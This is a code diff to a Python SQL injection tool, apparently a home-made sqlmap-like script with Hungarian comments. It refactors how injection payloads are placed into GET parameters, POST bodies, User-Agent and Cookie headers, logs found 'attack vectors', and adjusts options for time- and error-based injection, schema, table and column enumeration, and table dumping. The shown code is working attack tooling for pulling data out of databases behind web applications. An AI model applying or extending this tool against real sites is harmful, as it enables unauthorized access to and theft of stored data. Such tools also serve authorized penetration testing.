@@ -175,24 +175,24 @@ def setPayload(pData):
             parameters = {paramLeft : svData}
             payload_str = "&".join("%s=%s" % (k,v) for k,v in parameters.items())
             logki(logAll,payload_str)
-        if subMethod == GETMETHODS[GET_DIRECT]:
+        else:
             payload_str = preVar+pData
     if method == 'POST':
-        if subMethod == POSTMETHODS[POST_DATA]:
-            svData = preVar+pData
-            svData = svData.replace(' ', inSpace)
-            svData = svData+restVar
-            logki(logAll,svData)
         if subMethod == POSTMETHODS[USER_AGENT]:
             payload_str = useUserAgent+preVar+pData+restVar
             logki(logAll,payload_str)
             setHeader(sutike, payload_str)
             svData = pvUserAgentData
-        if subMethod == POSTMETHODS[COOKIE_MOD]:
+        elif subMethod == POSTMETHODS[COOKIE_MOD]:
             payload_str = sutike+preVar+pData+restVar
             logki(logAll,payload_str)
             setHeader(payload_str, useUserAgent)
             svData = pvUserAgentData
+        else:
+            svData = preVar+pData
+            svData = svData.replace(' ', inSpace)
+            svData = svData+restVar
+            logki(logAll,"svData: "+svData)
     return svData
 
 def digitFind_sqliType(forWhat):
@@ -285,6 +285,8 @@ def testRun():
     global subMethod
     global keyCmd
     global sutike
+    global payload_str
+    payload_str = ""
     subMethod = 'tests...'
     runparams()
     response = ''
@@ -341,24 +343,24 @@ def testRun():
                                 #parameters = {'option' : 'com_fields', 'view' : 'fields', 'layout' : 'modal' , 'list[fullordering]' : data}
                                 payload_str = "&".join("%s=%s" % (k,v) for k,v in parameters.items())
                                 #logki(logAll,payload_str)
-                            if method == 'POST' and not(method == 'POST'):
-                                data = preVar+data
-                                data = data.replace(' ', spcF)
-                                data = data+restVar
-                                payload_str = data
-                            if method == 'POST' and subMethod == POSTMETHODS[USER_AGENT]:
-                                payload_str = useUserAgent+data
-                                logki(logAll,payload_str)
-                                setHeader(sutike, payload_str)
-                                data = preVar + restVar
-                            if method == 'POST' and subMethod == POSTMETHODS[COOKIE_MOD]:
-                                if sutike == '' or sutike[0] == ' ':
-                                    sutike = 'C' + sutike
-                                payload_str = sutike+data
-                                logki(logAll,payload_str)
-                                setHeader(payload_str, useUserAgent)
-                                data = preVar + restVar
-                            logki(logAll,data)
+                            if method == 'POST':
+                                if subMethod == POSTMETHODS[USER_AGENT]:
+                                    payload_str = useUserAgent+data
+                                    setHeader(sutike, payload_str)
+                                    data = preVar + restVar
+                                elif method == 'POST' and subMethod == POSTMETHODS[COOKIE_MOD]:
+                                    if sutike == '' or sutike[0] == ' ':
+                                        sutike = 'C' + sutike
+                                    payload_str = sutike+data
+                                    setHeader(payload_str, useUserAgent)
+                                    data = preVar + restVar
+                                else:
+                                    data = preVar+data
+                                    data = data.replace(' ', spcF)
+                                    data = data+restVar
+                                    payload_str = data
+                            logki(logAll,"data       : "+data)
+                            logki(logAll,"payload_str: "+payload_str)
                             tstart = datetime.now()
                             if method == 'GET':
                                 if gethdik == 0:
@@ -413,7 +415,7 @@ def testRun():
         print('---')
         print('!Attack vector(s) found: '+str(findN)+'!')
         #print(payloadParams)
-        print(tabulate(payloadParams, headers=['#','rnd','quote','plPfx','space','plSfx','suffix','payload'], tablefmt='orgtbl'))
+        print(tabulate(payloadParams, headers=['#','rnd','quote -ph','plPfx -ph','-sp(ace)','colNull','suffix -pt','payload'], tablefmt='orgtbl'))
         print('---')
     else:
         print('Not found. :-(')
@@ -684,7 +686,7 @@ def db_alap_q(roundS,desc,query,rest,limites):
     return
 
 def info_q():
-    global defaultdb
+    #global defaultdb
     print(' --< Info query ]--[ ')
     runparams()
 #infolekérdezséek
@@ -698,8 +700,8 @@ def info_q():
     print('---')
 
 def schema_q():
-    global defaultdb
-    global inSpace
+    #global defaultdb
+    #global inSpace
     print(' --< Schema query ]--[ ')
     runparams()
 #schema/db lekrdezések
@@ -717,8 +719,8 @@ def schema_q():
 def table_q(): #tábla lekrdezések
     global dbname
     global defaultdb
-    global defDBt
-    global inSpace
+    #global defDBt
+    #global inSpace
     print(' --< DB query ]--[ ')
     runparams()
     print("Database      ["+dbname+"]")
@@ -744,11 +746,11 @@ def table_q(): #tábla lekrdezések
     print('---')
 
 def column_q(): #lekérdezett vagy megadott tábla alapján mező lekérdezések
-    global dbname
-    global defaultdb
-    global defDBt
-    global tablename
-    global inSpace
+    #global dbname
+    #global defaultdb
+    #global defDBt
+    #global tablename
+    #global inSpace
     print(' --< Table query ]--[ ')
     runparams()
     tableN = 1
@@ -838,7 +840,7 @@ def main():
     parser.add_argument("--ssl",action='store_true')
     parser.add_argument("-p","--proxy_http",help="Input a http proxy",type=str)
     parser.add_argument("-ps","--proxy_https",help="Input a https proxy",type=str)
-    parser.add_argument("-st","--sqli_type",help="Input SQLi type (default = 1 - time-based, 2 - error-based).",type=int)
+    parser.add_argument("-st","--sqli_type",help="Input SQLi type (default 0 - time-based, 1 - error-based).",type=int)
     parser.add_argument("-rs","--response_size",help="Response limit size (kb)",type=int)
 
     parser.add_argument("--test",help="Payload test run (paramters needed).",action='store_true')
@@ -850,7 +852,7 @@ def main():
     parser.add_argument("-T","--table",help="Selected table name.",type=str)
     parser.add_argument("--dump",help="Selected table: -T dump in selected DB: -D.",action='store_true')
 
-    parser.add_argument("-rt","--response_time",help="Delay time in second. (default = 1, 1 -> 5 )",type=int)
+    parser.add_argument("-rt","--response_time",help="Delay time in second. (default 1, 1 -> 5 )",type=int)
     parser.add_argument("-sp","--space",help="Space replacement char(s).",type=str)
     parser.add_argument("-v","--verbose",help="Verbose level. (default = 0, 0 -> 3 )",type=int)
 
